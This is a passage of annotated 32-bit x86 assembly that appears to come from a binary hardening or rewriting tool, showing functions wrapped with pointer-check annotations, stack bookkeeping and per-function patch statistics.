   mov     %ebp, %eax                         # [53(1105)]   #32
   test    %al, %al                           # [54(1106)]   #32
   jne     Label_0x80491a0 #32
   movl    $0x10, 0x4(%esp)                   # [56(1108)]   #32
   movl    $0x1, (%esp)                       # [57(1109)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x80490bb
   .long    Func_0x804a2d0  #pp1w: Label_0x804a2d0 VAR_ADDRESS #32
   movsd   (%esi, %ebx ,  0x8), %xmm0         # [59(1111)]Using Pointer PTRCHECK arg[0]  Already checked [42]   # <<<=== Need to Address an Array
   movsd   %xmm0, (%eax)                      # [60(1112)]Using Pointer PTRCHECK arg[1]    #32
   mov     0x54(%esp), %edx                   # [61(1113)]   #32
   mov     (%edx), %ecx                       # [62(1114)]Using Pointer PTRCHECK arg[0]    #32
   test    %ecx, %ecx                         # [63(1115)]   #32
   je      Label_0x80490e6 #32
   test    %eax, %eax                         # [65(1117)]   #32
   je      Label_0x80490e8 #32
   mov     %ecx, 0xc(%eax)                    # [67(1119)]Using Pointer PTRCHECK arg[1]    #32
   movl    $0x0, 0x8(%eax)                    # [68(1120)]Using Pointer PTRCHECK arg[1]    #32
   mov     (%edx), %ecx                       # [69(1121)]Using Pointer PTRCHECK arg[0]  Already checked [62]   #32
   mov     %eax, 0x8(%ecx)                    # [70(1122)]Using Pointer PTRCHECK arg[1]    #32
Label_0x80490e6: #p6a
   mov     %eax, (%edx)                       # [71(1123)]Using Pointer PTRCHECK arg[1]  Already checked [69, 62]   #32
Label_0x80490e8: #p6a
   mov     (%esi, %ebx ,  0x8), %ecx          # [72(1124)]Using Pointer PTRCHECK arg[0]  Already checked [59]   # <<<=== Need to Address an Array
   mov     0x4(%esi, %ebx ,  0x8), %edx       # [73(1125)]Using Pointer PTRCHECK arg[0]  Already checked [43]   # <<<=== Need to Address an Array
   call    _FuncWrapperHeader      # 2. my address is 0x80490ef
   .long    Func_0x8049270  #pp1w: Label_0x8049270 VAR_ADDRESS #32
   test    %eax, %eax                         # [75(1127)]   #32
   je      Label_0x80491a0 #32
   movl    $0x18, 0x4(%esp)                   # [77(1129)]   #32
   movl    $0x1, (%esp)                       # [78(1130)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804910b
   .long    Func_0x804a2d0  #pp1w: Label_0x804a2d0 VAR_ADDRESS #32
   mov     0x1c(%esp), %ecx                   # [80(1132)]   #32
   test    %ecx, %ecx                         # [81(1133)]   #32
   jne     Label_0x8049125 #32
   movsd   (%esi, %ebx ,  0x8), %xmm0         # [83(1135)]Using Pointer PTRCHECK arg[0]  Already checked [72]   # <<<=== Need to Address an Array
   jmp     Label_0x8049133 #32
Label_0x804911f: #p6a
   addl    $0x1, 0x28(%esp)                   # [85(1137)]Using Pointer PTRCHECK arg[0]  Already checked [85]   #32
   jmp     Label_0x80491a0 #32
Label_0x8049125: #p6a
   movsd   (%ecx), %xmm0                      # [87(1139)]Using Pointer PTRCHECK arg[0]    #32
   movsd   0x8(%ecx), %xmm1                   # [88(1140)]Using Pointer PTRCHECK arg[0]    #32
   movsd   %xmm1, 0x8(%eax)                   # [89(1141)]Using Pointer PTRCHECK arg[1]  Already checked [68]   #32
Label_0x8049133: #p6a
   movsd   %xmm0, (%eax)                      # [90(1142)]Using Pointer PTRCHECK arg[1]  Already checked [60]   #32
   mov     0x24(%esp), %edx                   # [91(1143)]   #32
   movl    $0x1, 0x8(%eax)                    # [92(1144)]Using Pointer PTRCHECK arg[1]  Already checked [68, 89]   #32
   mov     (%edx), %ecx                       # [93(1145)]Using Pointer PTRCHECK arg[0]    #32
   test    %ecx, %ecx                         # [94(1146)]   #32
   je      Label_0x8049161 #32
   test    %eax, %eax                         # [96(1148)]   #32
   jne     Label_0x8049152 #32
   mov     %edx, 0x24(%esp)                   # [98(1150)]   #32
   jmp     Label_0x80491a0 #32
Label_0x8049152: #p6a
   mov     %ecx, 0x14(%eax)                   # [100(1152)]Using Pointer PTRCHECK arg[1]    #32
   movl    $0x0, 0x10(%eax)                   # [101(1153)]Using Pointer PTRCHECK arg[1]    #32
   mov     (%edx), %ecx                       # [102(1154)]Using Pointer PTRCHECK arg[0]  Already checked [93]   #32
   mov     %eax, 0x10(%ecx)                   # [103(1155)]Using Pointer PTRCHECK arg[1]    #32
Label_0x8049161: #p6a
   mov     %eax, (%edx)                       # [104(1156)]Using Pointer PTRCHECK arg[1]  Already checked [102, 93]   #32
   mov     %edx, 0x24(%esp)                   # [105(1157)]   #32
   jmp     Label_0x80491a0 #32
Label_0x8049170: #p6a
   mov     (%esi, %ebx ,  0x8), %eax          # [107(1159)]Using Pointer PTRCHECK arg[0]    # <<<=== Need to Address an Array
   test    %eax, %eax                         # [108(1160)]   #32
   jns     Label_0x8049180 #32
   mov     %ebp, %edi                         # [110(1162)]   #32
   jmp     Label_0x80491a0 #32
Label_0x8049180: #p6a
   mov     0x4(%esi, %ebx ,  0x8), %ecx       # [112(1164)]Using Pointer PTRCHECK arg[0]    # <<<=== Need to Address an Array
   test    %ecx, %ecx                         # [113(1165)]   #32
   jns     Label_0x804918c #32
   mov     %ebp, %edi                         # [115(1167)]   #32
   jmp     Label_0x80491a0 #32
Label_0x804918c: #p6a
   cmp     $0x2000, %eax                      # [117(1169)]   #32
   jle     Label_0x804902a #32
   mov     %ebp, %edi                         # [119(1171)]   #32
Label_0x80491a0: #p6a
   add     $0x1, %ebx                         # [120(1172)]   #32
   cmp     $0x8, %ebx                         # [121(1173)]   #32
   mov     %edi, %ebp                         # [122(1174)]# FLAGS USED   #32
   jne     Label_0x8049170 #32
   movl    $0x10, 0x4(%esp)                   # [124(1176)]   #32
   movl    $0x1, (%esp)                       # [125(1177)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x80491b7
   .long    Func_0x804a2d0  #pp1w: Label_0x804a2d0 VAR_ADDRESS #32
   lea     0x44(%esp), %edi                   # [127(1179)] Loading Pointer with stackSize: 60   #32
   movsd   (%edi), %xmm0                      # [128(1180)]Using Pointer PTRCHECK arg[0]    #32
   movsd   %xmm0, (%eax)                      # [129(1181)]Using Pointer PTRCHECK arg[1]  Already checked [60, 90]   #32
   mov     0x54(%esp), %edx                   # [130(1182)]   #32
   mov     (%edx), %ecx                       # [131(1183)]Using Pointer PTRCHECK arg[0]    #32
   test    %ecx, %ecx                         # [132(1184)]   #32
   je      Label_0x80491e5 #32
   test    %eax, %eax                         # [134(1186)]   #32
   je      Label_0x80491e7 #32
   mov     %ecx, 0xc(%eax)                    # [136(1188)]Using Pointer PTRCHECK arg[1]  Already checked [67]   #32
   movl    $0x0, 0x8(%eax)                    # [137(1189)]Using Pointer PTRCHECK arg[1]  Already checked [68, 92, 50]   #32
   mov     (%edx), %ecx                       # [138(1190)]Using Pointer PTRCHECK arg[0]  Already checked [131]   #32
   mov     %eax, 0x8(%ecx)                    # [139(1191)]Using Pointer PTRCHECK arg[1]    #32
Label_0x80491e5: #p6a
   mov     %eax, (%edx)                       # [140(1192)]Using Pointer PTRCHECK arg[1]  Already checked [131, 138]   #32
Label_0x80491e7: #p6a
   movl    $0x18, 0x4(%esp)                   # [141(1193)]   #32
   movl    $0x1, (%esp)                       # [142(1194)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x80491f6
   .long    Func_0x804a2d0  #pp1w: Label_0x804a2d0 VAR_ADDRESS #32
   movsd   (%edi), %xmm0                      # [144(1196)]Using Pointer PTRCHECK arg[0]  Already checked [128]   #32
   movsd   0x8(%edi), %xmm1                   # [145(1197)]Using Pointer PTRCHECK arg[0]    #32
   movsd   %xmm1, 0x8(%eax)                   # [146(1198)]Using Pointer PTRCHECK arg[1]  Already checked [68, 137, 50, 92]   #32
   movsd   %xmm0, (%eax)                      # [147(1199)]Using Pointer PTRCHECK arg[1]  Already checked [129]   #32
   mov     0x28(%esp), %ecx                   # [148(1200)]   #32
   and     $-0x2, %ecx                        # [149(1201)]   #32
   cmp     $0x2, %ecx                         # [150(1202)]   #32
   jne     Label_0x8049230 #32
   movl    $0x1, 0x8(%eax)                    # [152(1204)]Using Pointer PTRCHECK arg[1]  Already checked [146]   #32
   mov     0x24(%esp), %edx                   # [153(1205)]   #32
   mov     (%edx), %ecx                       # [154(1206)]Using Pointer PTRCHECK arg[0]    #32
   test    %ecx, %ecx                         # [155(1207)]   #32
   je      Label_0x8049250 #32
   test    %eax, %eax                         # [157(1209)]   #32
   jne     Label_0x8049241 #32
   jmp     Label_0x8049252 #32
Label_0x8049230: #p6a
   movl    $0x0, 0x8(%eax)                    # [160(1212)]Using Pointer PTRCHECK arg[1]  Already checked [146]   #32
   mov     0x20(%esp), %edx                   # [161(1213)]   #32
   mov     (%edx), %ecx                       # [162(1214)]Using Pointer PTRCHECK arg[0]    #32
   test    %ecx, %ecx                         # [163(1215)]   #32
   je      Label_0x8049250 #32
Label_0x8049241: #p6a
   mov     %ecx, 0x14(%eax)                   # [165(1217)]Using Pointer PTRCHECK arg[1]  Already checked [100]   #32
   movl    $0x0, 0x10(%eax)                   # [166(1218)]Using Pointer PTRCHECK arg[1]  Already checked [101]   #32
   mov     (%edx), %ecx                       # [167(1219)]Using Pointer PTRCHECK arg[0]  Already checked [154, 162]   #32
   mov     %eax, 0x10(%ecx)                   # [168(1220)]Using Pointer PTRCHECK arg[1]    #32
Label_0x8049250: #p6a
   mov     %eax, (%edx)                       # [169(1221)]Using Pointer PTRCHECK arg[1]  Already checked [167, 162, 154]   #32
Label_0x8049252: #p6a
   mov     %esi, (%esp)                       # [170(1222)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049255
   .long    Func_0x804a500  #pp1w: Label_0x804a500 VAR_ADDRESS #32
   add     $0x2c, %esp                        # [172(1224)]stackSize = 0x10   #32
   pop     %esi                               # [173(1225)]stackSize = 0xc   #32
   pop     %edi                               # [174(1226)]stackSize = 0x8   #32
   pop     %ebx                               # [175(1227)]stackSize = 0x4   #32
   pop     %ebp                               # [176(1228)]stackSize = 0x0   #32
Label_0x8049261: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:13 Patched 0 in 0.002 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 14
     adding function wrapper

;     Start Index : 1230 (0x8049270)
;       End Index : 1265 (0x80492d0)
;   Num Instructs : 36
;      Stack Size : 12 (0xc)
;          Pushes : 4 (0x4)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 3
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 0
;      Local Vars : 0
;      ESP Others : 3
;     ESP Offsets : 3
;                 :  0x0(0xc), 0x4(0x8), 0x8(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x920,7
.p2align 3,0x925
FuncPtr_0x8049270:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x8049270,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x8049270:

Label_0x8049270:
   push    %ebp                               # [0(1230)]stackSize = 0x4   #32
   push    %ebx                               # [1(1231)]stackSize = 0x8   #32
   push    %edi                               # [2(1232)]stackSize = 0xc   #32
   push    %esi                               # [3(1233)]stackSize = 0x10   #32
   sub     $0xc, %esp                         # [4(1234)]stackSize = 0x1c   #32
   mov     %edx, 0x4(%esp)                    # [5(1235)]   #32
   mov     %ecx, (%esp)                       # [6(1236)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804927e
   .long    Func_0x80480a0  #pp1w: Label_0x80480a0 VAR_ADDRESS #32
   mov     %eax, %esi                         # [8(1238)]   #32
   xor     %edi, %edi                         # [9(1239)]   #32
   mov     Var_0x80602a8, %ebx                # [10(1240)]   #32
   xor     %ebp, %ebp                         # [11(1241)]   #32
Label_0x8049290: #p6a
   mov     (%esi, %ebp ,  0x8), %eax          # [12(1242)]Using Pointer PTRCHECK arg[0]    # <<<=== Need to Address an Array
   mov     0x4(%esi, %ebp ,  0x8), %ecx       # [13(1243)]Using Pointer PTRCHECK arg[0]    # <<<=== Need to Address an Array
   mov     %ecx, 0x8(%esp)                    # [14(1244)]   #32
   mov     %eax, 0x4(%esp)                    # [15(1245)]   #32
   mov     %ebx, (%esp)                       # [16(1246)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x80492a2
   .long    Func_0x8048290  #pp1w: Label_0x8048290 VAR_ADDRESS #32
   test    %eax, %eax                         # [18(1248)]   #32
   je      Label_0x80492b2 #32
   cmpl    $0x1, 0x8(%eax)                    # [20(1250)]Using Pointer PTRCHECK arg[1]    #32
   sbb     $-0x1, %edi                        # [21(1251)]   #32
Label_0x80492b2: #p6a
   add     $0x1, %ebp                         # [22(1252)]   #32
   cmp     $0x8, %ebp                         # [23(1253)]   #32
   jne     Label_0x8049290 #32
   mov     %esi, (%esp)                       # [25(1255)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x80492bb
   .long    Func_0x804a500  #pp1w: Label_0x804a500 VAR_ADDRESS #32
   cmp     $0x3, %edi                         # [27(1257)]   #32
   sete    %al                                # [28(1258)]   #32
   movzbl  %al, %eax                          # [29(1259)]   #32
   add     $0xc, %esp                         # [30(1260)]stackSize = 0x10   #32
   pop     %esi                               # [31(1261)]stackSize = 0xc   #32
   pop     %edi                               # [32(1262)]stackSize = 0x8   #32
   pop     %ebx                               # [33(1263)]stackSize = 0x4   #32
   pop     %ebp                               # [34(1264)]stackSize = 0x0   #32
Label_0x80492d0: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:14 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 17
     adding function wrapper

;     Start Index : 1346 (0x80493d0)
;       End Index : 1420 (0x80494d9)
;   Num Instructs : 75
;      Stack Size : 92 (0x5c)
;          Pushes : 4 (0x4)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 4
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 0
;      Local Vars : 0
;      ESP Others : 18
;     ESP Offsets : 18
;                 :  0x0(0x5c), 0x8(0x54), 0x18(0x44), 0x1c(0x40),
;                 :  0x20(0x3c), 0x24(0x38), 0x28(0x34), 0x2c(0x30),
;                 :  0x30(0x2c), 0x34(0x28), 0x38(0x24), 0x3c(0x20),
;                 :  0x40(0x1c), 0x44(0x18), 0x48(0x14), 0x4c(0x10),
;                 :  0x50(0xc), 0x54(0x8); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 4
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x6020,7
.p2align 3,0x6025
FuncPtr_0x80493d0:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x80493d0,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x80493d0:

Label_0x80493d0:
   push    %ebp                               # [0(1346)]stackSize = 0x4   #32
   push    %ebx                               # [1(1347)]stackSize = 0x8   #32
   push    %edi                               # [2(1348)]stackSize = 0xc   #32
   push    %esi                               # [3(1349)]stackSize = 0x10   #32
   sub     $0x5c, %esp                        # [4(1350)]stackSize = 0x6c   #32
   mov     %ecx, %esi                         # [5(1351)]   #32
   mov     (%esi), %ecx                       # [6(1352)]Using Pointer PTRCHECK arg[0]    #32
   test    %ecx, %ecx                         # [7(1353)]   #32
   mov     $-0x1, %eax                        # [8(1354)]# FLAGS USED   #32
   je      Label_0x80494d2 #32
   sub     $0x1, %ecx                         # [10(1356)]   #32
   mov     $0x1, %eax                         # [11(1357)]   #32
   shl     %cl, %eax                          # [12(1358)]   #32
   mov     0x10(%esi), %ecx                   # [13(1359)]Using Pointer PTRCHECK arg[0]    #32
   mov     0x14(%esi), %edx                   # [14(1360)]Using Pointer PTRCHECK arg[0]    #32
   mov     0x18(%esi), %edi                   # [15(1361)]Using Pointer PTRCHECK arg[0]    #32
   mov     0x1c(%esi), %ebx                   # [16(1362)]Using Pointer PTRCHECK arg[0]    #32
   mov     %ecx, 0x48(%esp)                   # [17(1363)]   #32
   mov     %edx, 0x4c(%esp)                   # [18(1364)]   #32
   lea     (%ecx, %eax ,  0x1), %ebp          # [19(1365)] Loading Pointer with stackSize: 108   # <<<=== Need to Address an Array
   mov     %ebp, 0x50(%esp)                   # [20(1366)]   #32
   add     %edx, %eax                         # [21(1367)]   #32
   mov     %eax, 0x54(%esp)                   # [22(1368)]   #32
   mov     %ebp, 0x38(%esp)                   # [23(1369)]   #32
   mov     %edx, 0x3c(%esp)                   # [24(1370)]   #32
   mov     %edi, 0x40(%esp)                   # [25(1371)]   #32
   mov     %eax, 0x44(%esp)                   # [26(1372)]   #32
   mov     %ecx, 0x28(%esp)                   # [27(1373)]   #32
   mov     %eax, 0x2c(%esp)                   # [28(1374)]   #32
   mov     %ebp, 0x30(%esp)                   # [29(1375)]   #32
   mov     %ebx, 0x34(%esp)                   # [30(1376)]   #32
   mov     %ebp, 0x18(%esp)                   # [31(1377)]   #32
   mov     %eax, 0x1c(%esp)                   # [32(1378)]   #32
   mov     %edi, 0x20(%esp)                   # [33(1379)]   #32
   mov     %ebx, 0x24(%esp)                   # [34(1380)]   #32
   mov     (%esi), %ecx                       # [35(1381)]Using Pointer PTRCHECK arg[0]  Already checked [6]   #32
   sub     $0x1, %ecx                         # [36(1382)]   #32
   movsd   0x48(%esp), %xmm0                  # [37(1383)]   #32
   movsd   0x50(%esp), %xmm1                  # [38(1384)]   #32
   movsd   %xmm1, 0x8(%esp)                   # [39(1385)]   #32
   movsd   %xmm0, (%esp)                      # [40(1386)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804945b
   .long    Func_0x8048460  #pp1w: Label_0x8048460 VAR_ADDRESS #32
   mov     %eax, 0x38(%esi)                   # [42(1388)]Using Pointer PTRCHECK arg[1]    #32
   mov     (%esi), %ecx                       # [43(1389)]Using Pointer PTRCHECK arg[0]  Already checked [35]   #32
   sub     $0x1, %ecx                         # [44(1390)]   #32
   movsd   0x38(%esp), %xmm0                  # [45(1391)]   #32
   movsd   0x40(%esp), %xmm1                  # [46(1392)]   #32
   movsd   %xmm1, 0x8(%esp)                   # [47(1393)]   #32
   movsd   %xmm0, (%esp)                      # [48(1394)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804947d
   .long    Func_0x8048460  #pp1w: Label_0x8048460 VAR_ADDRESS #32
   mov     %eax, 0x3c(%esi)                   # [50(1396)]Using Pointer PTRCHECK arg[1]    #32
   mov     (%esi), %ecx                       # [51(1397)]Using Pointer PTRCHECK arg[0]  Already checked [43]   #32
   sub     $0x1, %ecx                         # [52(1398)]   #32
   movsd   0x28(%esp), %xmm0                  # [53(1399)]   #32
   movsd   0x30(%esp), %xmm1                  # [54(1400)]   #32
   movsd   %xmm1, 0x8(%esp)                   # [55(1401)]   #32
   movsd   %xmm0, (%esp)                      # [56(1402)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804949f
   .long    Func_0x8048460  #pp1w: Label_0x8048460 VAR_ADDRESS #32
   mov     %eax, 0x40(%esi)                   # [58(1404)]Using Pointer PTRCHECK arg[1]    #32
   mov     (%esi), %ecx                       # [59(1405)]Using Pointer PTRCHECK arg[0]  Already checked [51]   #32
   sub     $0x1, %ecx                         # [60(1406)]   #32
   movsd   0x18(%esp), %xmm0                  # [61(1407)]   #32
   movsd   0x20(%esp), %xmm1                  # [62(1408)]   #32
   movsd   %xmm1, 0x8(%esp)                   # [63(1409)]   #32
   movsd   %xmm0, (%esp)                      # [64(1410)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x80494c1
   .long    Func_0x8048460  #pp1w: Label_0x8048460 VAR_ADDRESS #32
   mov     %eax, 0x44(%esi)                   # [66(1412)]Using Pointer PTRCHECK arg[1]    #32
   movl    $0x1, 0x20(%esi)                   # [67(1413)]Using Pointer PTRCHECK arg[1]    #32
   xor     %eax, %eax                         # [68(1414)]   #32
Label_0x80494d2: #p6a
   add     $0x5c, %esp                        # [69(1415)]stackSize = 0x10   #32
   pop     %esi                               # [70(1416)]stackSize = 0xc   #32
   pop     %edi                               # [71(1417)]stackSize = 0x8   #32
   pop     %ebx                               # [72(1418)]stackSize = 0x4   #32
   pop     %ebp                               # [73(1419)]stackSize = 0x0   #32
Label_0x80494d9: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:17 Patched 0 in 0.019 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 49
     adding function wrapper

;     Start Index : 2656 (0x804a840)
;       End Index : 2736 (0x804a92c)
;   Num Instructs : 81
;      Stack Size : 8 (0x8)
;          Pushes : 1 (0x1)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 11
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 1
;      Local Vars : 0
;      ESP Others : 1
;     ESP Offsets : 2
;                 :  0x0(0x8),
;      ESP Params : 
;                 :  0x10(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 14
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x8220,7
.p2align 3,0x8225
FuncPtr_0x804a840:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x804a840,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x804a840:

Label_0x804a840:
   push    %esi                               # [0(2656)]stackSize = 0x4   #32
   sub     $0x8, %esp                         # [1(2657)]stackSize = 0xc   #32
   mov     0x14(%esp), %esi                   # [2(2658)]   #32
   mov     0x14(%esi), %eax                   # [3(2659)]Using Pointer PTRCHECK arg[0]    #32
   test    %eax, %eax                         # [4(2660)]   #32
   je      Label_0x804a8ff #32
   cmpl    $0x0, 0x4(%eax)                    # [6(2662)]Using Pointer PTRCHECK arg[1]    #32
   je      Label_0x804a8a7 #32
   mov     0x10(%esi), %ecx                   # [8(2664)]Using Pointer PTRCHECK arg[0]    #32
   test    %ecx, %ecx                         # [9(2665)]   #32
   je      Label_0x804a8a7 #32
   cmpl    $0x0, 0x4(%ecx)                    # [11(2667)]Using Pointer PTRCHECK arg[1]    #32
   je      Label_0x804a8a7 #32
   mov     %eax, (%esp)                       # [13(2669)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804a869
   .long    Func_0x804a7e0  #pp1w: Label_0x804a7e0 VAR_ADDRESS #32
   mov     0x10(%esi), %eax                   # [15(2671)]Using Pointer PTRCHECK arg[0]  Already checked [8]   #32
   mov     %eax, (%esp)                       # [16(2672)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804a874
   .long    Func_0x804a7e0  #pp1w: Label_0x804a7e0 VAR_ADDRESS #32
   mov     %esi, (%esp)                       # [18(2674)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804a87c
   .long    Func_0x804a7e0  #pp1w: Label_0x804a7e0 VAR_ADDRESS #32
   mov     (%esi), %eax                       # [20(2676)]Using Pointer PTRCHECK arg[0]    #32
   mov     0x14(%esi), %ecx                   # [21(2677)]Using Pointer PTRCHECK arg[0]  Already checked [3]   #32
   add     %eax, (%ecx)                       # [22(2678)]Using Pointer PTRCHECK arg[1]    #32
   mov     0x10(%esi), %eax                   # [23(2679)]Using Pointer PTRCHECK arg[0]  Already checked [15]   #32
   mov     0x14(%esi), %ecx                   # [24(2680)]Using Pointer PTRCHECK arg[0]  Already checked [21]   #32
   mov     (%eax), %eax                       # [25(2681)]Using Pointer PTRCHECK arg[0]    #32
   add     %eax, (%ecx)                       # [26(2682)]Using Pointer PTRCHECK arg[1]    #32
   mov     0x14(%esi), %eax                   # [27(2683)]Using Pointer PTRCHECK arg[0]  Already checked [24]   #32
   mov     %eax, (%esp)                       # [28(2684)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804a898
   .long    Func_0x804a790  #pp1w: Label_0x804a790 VAR_ADDRESS #32
   mov     0x10(%esi), %ecx                   # [30(2686)]Using Pointer PTRCHECK arg[0]  Already checked [23]   #32
   call    Func_0x804a930  #pp1: Label_0x804a930 VAR_ADDRESS #32
   jmp     Label_0x804a926 #32
Label_0x804a8a7: #p6a
   mov     0x14(%esi), %eax                   # [33(2689)]Using Pointer PTRCHECK arg[0]  Already checked [3]   #32
   test    %eax, %eax                         # [34(2690)]   #32
   je      Label_0x804a8ff #32
   cmpl    $0x0, 0x4(%eax)                    # [36(2692)]Using Pointer PTRCHECK arg[1]    #32
   je      Label_0x804a8c1 #32
   mov     0x10(%esi), %ecx                   # [38(2694)]Using Pointer PTRCHECK arg[0]  Already checked [8]   #32
   test    %ecx, %ecx                         # [39(2695)]   #32
   je      Label_0x804a8c1 #32
   cmpl    $0x0, 0x4(%ecx)                    # [41(2697)]Using Pointer PTRCHECK arg[1]    #32
   je      Label_0x804a904 #32
Label_0x804a8c1: #p6a
   mov     0x14(%esi), %eax                   # [43(2699)]Using Pointer PTRCHECK arg[0]  Already checked [33]   #32
   test    %eax, %eax                         # [44(2700)]   #32
   je      Label_0x804a8ff #32
   cmpl    $0x0, 0x4(%eax)                    # [46(2702)]Using Pointer PTRCHECK arg[1]    #32
   jne     Label_0x804a8ff #32
   mov     0x10(%esi), %eax                   # [48(2704)]Using Pointer PTRCHECK arg[0]  Already checked [38, 8]   #32
   test    %eax, %eax                         # [49(2705)]   #32
   je      Label_0x804a8ff #32
   cmpl    $0x0, 0x4(%eax)                    # [51(2707)]Using Pointer PTRCHECK arg[1]    #32
   je      Label_0x804a8ff #32
   mov     %eax, (%esp)                       # [53(2709)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804a8de
   .long    Func_0x804a7e0  #pp1w: Label_0x804a7e0 VAR_ADDRESS #32
   mov     %esi, (%esp)                       # [55(2711)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804a8e6
   .long    Func_0x804a7e0  #pp1w: Label_0x804a7e0 VAR_ADDRESS #32
   mov     0x10(%esi), %eax                   # [57(2713)]Using Pointer PTRCHECK arg[0]  Already checked [48]   #32
   mov     (%eax), %eax                       # [58(2714)]Using Pointer PTRCHECK arg[0]    #32
   add     %eax, (%esi)                       # [59(2715)]Using Pointer PTRCHECK arg[1]    #32
   mov     %esi, (%esp)                       # [60(2716)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804a8f5
   .long    Func_0x804a790  #pp1w: Label_0x804a790 VAR_ADDRESS #32
   mov     0x10(%esi), %ecx                   # [62(2718)]Using Pointer PTRCHECK arg[0]  Already checked [57]   #32
   jmp     Label_0x804a928 #32
Label_0x804a8ff: #p6a
   add     $0x8, %esp                         # [64(2720)]stackSize = 0x4   #32
   pop     %esi                               # [65(2721)]stackSize = 0x0   #32
Label_0x804a903: #p6a
   jmp     _FuncWrapperFooter
 # Ret here
Label_0x804a904: #p6a
   mov     %eax, (%esp)                       # [67(2723)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804a907
   .long    Func_0x804a7e0  #pp1w: Label_0x804a7e0 VAR_ADDRESS #32
   mov     %esi, (%esp)                       # [69(2725)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804a90f
   .long    Func_0x804a7e0  #pp1w: Label_0x804a7e0 VAR_ADDRESS #32
   mov     (%esi), %eax                       # [71(2727)]Using Pointer PTRCHECK arg[0]    #32
   mov     0x14(%esi), %ecx                   # [72(2728)]Using Pointer PTRCHECK arg[0]  Already checked [33]   #32
   add     %eax, (%ecx)                       # [73(2729)]Using Pointer PTRCHECK arg[1]    #32
   mov     0x14(%esi), %eax                   # [74(2730)]Using Pointer PTRCHECK arg[0]  Already checked [72]   #32
   mov     %eax, (%esp)                       # [75(2731)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804a921
   .long    Func_0x804a790  #pp1w: Label_0x804a790 VAR_ADDRESS #32
Label_0x804a926: #p6a
   mov     %esi, %ecx                         # [77(2733)]   #32
Label_0x804a928: #p6a
   add     $0x8, %esp                         # [78(2734)]stackSize = 0x4   #32
   pop     %esi                               # [79(2735)]stackSize = 0x0   #32
   pushl  $Func_0x804a930
   jmp  _FuncWrapperFooterJmpSafe
 #32

/*;;;;;;;; 
; id:49 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 36
     adding function wrapper

;     Start Index : 2296 (0x804a350)
;       End Index : 2311 (0x804a37a)
;   Num Instructs : 16
;      Stack Size : 8 (0x8)
;          Pushes : 1 (0x1)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 2
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 1
;      Local Vars : 0
;      ESP Others : 1
;     ESP Offsets : 2
;                 :  0x0(0x8),
;      ESP Params : 
;                 :  0x10(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x6120,7
.p2align 3,0x6125
FuncPtr_0x804a350:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x804a350,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x804a350:

Label_0x804a350:
   push    %esi                               # [0(2296)]stackSize = 0x4   #32
   sub     $0x8, %esp                         # [1(2297)]stackSize = 0xc   #32
   mov     0x14(%esp), %esi                   # [2(2298)]   #32
   mov     %esi, (%esp)                       # [3(2299)]   #32
   call    Func_0x804a390  #pp1: Label_0x804a390 VAR_ADDRESS #32
   test    %eax, %eax                         # [5(2301)]   #32
